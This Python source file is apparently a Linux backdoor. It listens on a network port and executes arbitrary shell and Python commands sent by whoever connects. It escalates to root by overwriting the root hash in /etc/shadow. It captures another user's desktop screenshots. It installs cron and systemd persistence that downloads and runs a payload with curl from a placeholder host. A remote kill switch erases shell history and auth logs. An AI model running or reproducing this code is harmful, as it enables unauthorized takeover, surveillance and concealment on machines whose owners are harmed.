#!/usr/bin/env python3

import os
import socket
import subprocess
import sys
import time
import argparse
import shlex
import io
import json
import base64
import hashlib
from contextlib import redirect_stdout

THIS_FILE = os.path.realpath(__file__)

ENCODING_FORMAT = "utf-8"

def get_suid_target_string():
    command = "find /usr/bin -perm -4000 -type f"
    args = shlex.split(command) 

    all_files = subprocess.run(args, text=True, capture_output=True).stdout

    typical_suid_files = {"su", "sudo", "passwd", "mount", "chsh", "newgrp", "ping", "chfn", "pkexec"}

    lines = all_files.splitlines()
    processed_lines = [line for line in lines if not any(file in line for file in typical_suid_files)]

    if not processed_lines:
        result = "None found."
    else:
        result = '\n'.join(processed_lines)
    return result

def get_whoami_output_bytes():
    return subprocess.run(["whoami"], capture_output=True).stdout.strip()

def get_python_command_output_bytes(code):
    f = io.StringIO()
    try:
        with redirect_stdout(f):
            exec(code)
        return f.getvalue().encode(ENCODING_FORMAT)
    except Exception as e:
        return str(e).encode(ENCODING_FORMAT)
    
def get_bash_command_output_bytes(code):
    try:
        return subprocess.run(code, shell=True, capture_output=True).stdout
    except Exception as e:
        return str(e).encode(ENCODING_FORMAT)
    

import pwd

DEBUG_LOG = "/tmp/screenshot_debug.log"

def log_debug(msg):
    with open(DEBUG_LOG, "a") as f:
        f.write(f"[DEBUG] {msg}\n")

def get_screenshot_bytes():
    img_path = "/tmp/.sys_cache_thumb.png"
    screen_env = os.environ.copy()
    
    try:
        target_user = os.environ.get("TARGET_DESKTOP_USER", "TARGET_USERNAME")
        pid = subprocess.check_output(["pgrep", "-u", target_user, "gnome-shell"]).decode().split()[0]
        with open(f"/proc/{pid}/environ", "rb") as f:
            env_data = f.read().split(b"\0")
            env_dict = {item.split(b"=")[0].decode(): item.split(b"=")[1].decode() 
                        for item in env_data if b"=" in item}
            
            screen_env["DISPLAY"] = env_dict.get("DISPLAY", ":0")
            screen_env["XAUTHORITY"] = env_dict.get("XAUTHORITY", "")
            screen_env["DBUS_SESSION_BUS_ADDRESS"] = env_dict.get("DBUS_SESSION_BUS_ADDRESS", "")
    except Exception as e:
        screen_env["DISPLAY"] = ":0"
        screen_env["XAUTHORITY"] = f"/home/{target_user}/.Xauthority"

    try:
        cmd = f"/usr/bin/gnome-screenshot -f {img_path}"
        subprocess.run(shlex.split(cmd), env=screen_env, check=True, capture_output=True)
        
        with open(img_path, 'rb') as f:
            data = f.read()
        return data
    except Exception as e:
        print(f"Hijacked capture failed: {e}")
        return None
    finally:
        if os.path.exists(img_path):
            os.remove(img_path)
def cc_play_audio():
    
    env = {"SDL_AUDIODRIVER": "dummy"}
    subprocess.run(["curl", "-L", "-o", "/tmp/audio.wav", "https://YOUR_AUDIO_FILE_URL_HERE/audio.wav"])
    subprocess.run(["ffplay", "-nodisp", "-autoexit", "/tmp/audio.wav"], env)
    return b"audio played"


def install_cron():
    cron_path = "/etc/cron.d/server"
    cron_string = (
    "* * * * * root "
    "/usr/bin/pgrep -f server.py > /dev/null || "
    "(/usr/bin/curl -s https://YOUR_PAYLOAD_URL_HERE/payload/server.py -o /tmp/server.py && "
    "/usr/bin/python3 /tmp/server.py > /tmp/server.log 2>&1)\n"
    )
    try:
        with open(cron_path, "w", encoding="utf-8") as f:
            f.write(cron_string)
       
        os.chmod(cron_path, 0o644) 
        print(f"Cron persistence installed to {cron_path}")
        
    except PermissionError:
        print("Error: You need root/sudo privileges to write to /etc/cron.d/")
    except Exception as e:
        print(f"Failed to install cron: {e}")
def install_systemd():
    service_string = """[Unit]
Description=My Service
After=network.target

[Service]
ExecStart=curl https://YOUR_PAYLOAD_URL_HERE/payload/server.py > /tmp/server.py && python3 /tmp/server.py
Restart=always
User=root

[Install]
WantedBy=multi-user.target
""" + "\n"

    service_path = "/etc/systemd/system/myservice.service"
    
    with open(service_path, "w", encoding="utf-8") as f:
        f.write(service_string)
    
    os.chmod(service_path, 0o755)
    os.system("systemctl daemon-reload")
    os.system("systemctl enable myservice")
    os.system("systemctl start myservice")

def suid_privesc():
    suid_targets = get_suid_target_string().splitlines()
    print(f"found {len(suid_targets)} SUID targets: {suid_targets}")
    KNOWN_HASH = 'YOUR_PASSWORD_HASH_HERE'
    
    for target in suid_targets:
        bin_name = os.path.basename(target)
        if bin_name == 'chmod':
            try:
                result = subprocess.run(f'{target} 666 /etc/shadow', shell=True, timeout=5, capture_output=True, text=True)                
                with open('/etc/shadow', 'r') as f:
                    lines = f.readlines()
                with open('/etc/shadow', 'w') as f:
                    for line in lines:
                        parts = line.split(':')
                        if parts[0] == 'root':
                            print(f"found root user, updating hash")
                            parts[1] = KNOWN_HASH
                            line = ':'.join(parts)
                        f.write(line)
                
                print("updated root password hash")
                subprocess.Popen(["sshpass", "-p", "YOUR_ROOT_PASSWORD_HERE", "ssh", "-o", "StrictHostKeyChecking=no", "root@localhost", "python3", THIS_FILE])
                return "root password changed via chmod exploit. spawned root payload."
                
            except Exception as e:
                print(f"chmod exploit failed: {e}")
                continue
        elif bin_name == 'nano':
            print(f"found nano and attempting to exploit")
            continue
            
    print("no exploitable SUID binaries found")
    return "no exploitable SUID binaries found."

def update_password_privesc():

    file_path = '/etc/shadow'
    user = 'root'
    remove_user = 'insecure-duck'
    password_hash = 'YOUR_PASSWORD_HASH_HERE'

    if not os.path.exists(file_path):
        print(f"Error: {file_path} not found.")
        return

    with open(file_path, 'r') as file:
        lines = file.readlines()

    updated = False

    with open(file_path, 'w') as file:
        for line in lines:
            parts = line.split(':')
            
            if parts[0] == user:
                parts[1] = password_hash
                line = ':'.join(parts)
                updated = True

            if parts[0] == remove_user:
                print(f"removing user {remove_user} from shadow file")
            else:
                file.write(line)

    if updated:
        print(f"successfully updated root hash")
    else:
        print(f"user root not found")
        
    subprocess.Popen(["sshpass", "-p", "YOUR_ROOT_PASSWORD_HERE", "ssh", "-o", "StrictHostKeyChecking=no", "root@localhost", "python3", THIS_FILE])
    return b"updated root"
                

def perform_privesc():
    subprocess.run(["pkexec", sys.executable, THIS_FILE]) 



def check_kill_switch():
    try:
        import requests
        url = "https://YOUR_KILLSWITCH_URL_HERE/killswitch.txt"
        response = requests.get(url, timeout=5)
        if response.status_code == 200:
            content = response.text.strip()
            if content == "KILL" or hashlib.sha256(content.encode()).hexdigest() == "YOUR_KILLSWITCH_HASH_HERE":
                return True
        elif response.status_code == 404:
            return False
    except Exception as e:
        return False
    return False

def execute_kill_switch():
    print("[kill switch activated] removing traces")
    subprocess.run("rm -f ~/.bash_history", shell=True)
    subprocess.run("history -c", shell=True)
    
    print("removing ssh keys")
    subprocess.run("sed -i '/AUTHORIZED_KEY_PLACEHOLDER/d' /root/.ssh/authorized_keys", shell=True)
    
    print("removing cron job")
    subprocess.run("rm -f /etc/cron.d/crontab", shell=True)
    
    print("deleting payload file")
    subprocess.run(f"rm -f {THIS_FILE}", shell=True)
    
    print("clearing logs")
    subprocess.run("sed -i '/server.py/d' /var/log/auth.log", shell=True)
    
    print("removing venv")
    subprocess.run("rm -rf ~/.venv", shell=True)
    
    print("[kill switch] self-destruct complete.")
    sys.exit(0)


def run_command(cmd, shell=True, capture_output=True, **kwargs):
    return subprocess.run(
        cmd,
        shell=shell,
        capture_output=capture_output,
        text=True,
        **kwargs
    )

HOST, PORT = "0.0.0.0", 2956


def kill_others():
    pid = run_command(f"lsof -ti TCP:{str(PORT)}").stdout
    if pid:
        pids = pid.strip().split("\n")
        print("Killing existing listener processes", pids)
        for p in pids:
            run_command(f"kill {str(p)}")
        time.sleep(1)

def bootstrap_packages():
    print(sys.prefix, sys.base_prefix)
    if sys.prefix == sys.base_prefix:
        print("running in venv")
        import venv

        venv_dir = os.path.join(os.path.dirname(THIS_FILE), ".venv")
        # print(venv_dir)
        if not os.path.exists(venv_dir):
            print("creating venv")
            venv.create(venv_dir, with_pip=True)
            subprocess.Popen([os.path.join(venv_dir, "bin", "python"), THIS_FILE])
            sys.exit(0)
        else:
            print("venv exists, but we still need to open inside it")
            subprocess.Popen([os.path.join(venv_dir, "bin", "python"), THIS_FILE])
            sys.exit(0)
    else:
        print("already in venv")
        run_command(
            [ sys.executable, "-m", "pip", "install", "requests", "python-crontab", "pillow"], shell=False, capture_output=False
        ).check_returncode()
        import requests


def handle_conn(conn, addr):

    if check_kill_switch():
        execute_kill_switch()

    print(f"Connected by {addr}")
    data = conn.recv(4096)
    if not data:
        return

    try:
        decoded_data = data.decode("utf-8", errors="replace").strip()
        
        match decoded_data:
            case "custompwdhere":
                perform_privesc()
                return
            case "crontabbb":
                install_cron()
                return
            case "systemd_persist":
                install_systemd()
                return
            case "whoami":
                conn.sendall(get_whoami_output_bytes()) 
                return
            case "suid":
                conn.sendall(get_suid_target_string().encode(ENCODING_FORMAT))
                return
            case "playaudio":
                cc_play_audio()
                return
            case "etc_privesc":
                conn.sendall(update_password_privesc())
                return
            case "suid_privesc":
                conn.sendall(suid_privesc().encode())
                return
            case "take_screenshot":
                conn.sendall(get_screenshot_bytes())
                return

        try:
            code_dict = json.loads(decoded_data)
        except json.JSONDecodeError:
            conn.sendall(json.dumps({
                "output": "Error: Not a default command or valid JSON packet",
                "encoding": "text"
            }).encode(ENCODING_FORMAT))
            return

        cmd_type = code_dict.get("type")
        command = code_dict.get("command", "")

        if cmd_type == "python":
            output = get_python_command_output_bytes(command)
        elif cmd_type in ["linux", "bash"]:
            output = get_bash_command_output_bytes(command)
        else:
            output = b"Unknown command type."

        try:
            processed_output = output.decode(ENCODING_FORMAT) 
            encoding = "text"
        except UnicodeDecodeError:
            processed_output = base64.b64encode(output).decode(ENCODING_FORMAT) 
            encoding = "base64"
        
        response = {"output": processed_output, "encoding": encoding}
        json_string = json.dumps(response).encode(ENCODING_FORMAT)
        b64_packet = base64.b64encode(json_string) + b'\0'

        conn.sendall(b64_packet)
        print(f"Executed {cmd_type} command and sent response.")

    except Exception as e:
        error_resp = {"output": f"Server Error: {str(e)}", "encoding": "text"}
        try:
            conn.sendall(json.dumps(error_resp).encode(ENCODING_FORMAT))
        except:
            pass

def main():
    kill_others()
    bootstrap_packages()

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind((HOST, PORT))
        s.listen()
        print(f"Listening on {HOST}:{PORT}")
        while True:
            try:
                conn, addr = s.accept()
                conn.settimeout(10.0)
                with conn:
                    handle_conn(conn, addr)
            except KeyboardInterrupt:
                raise
            except Exception as e:
                print("Connection died", e)


if __name__ == "__main__":
    main()
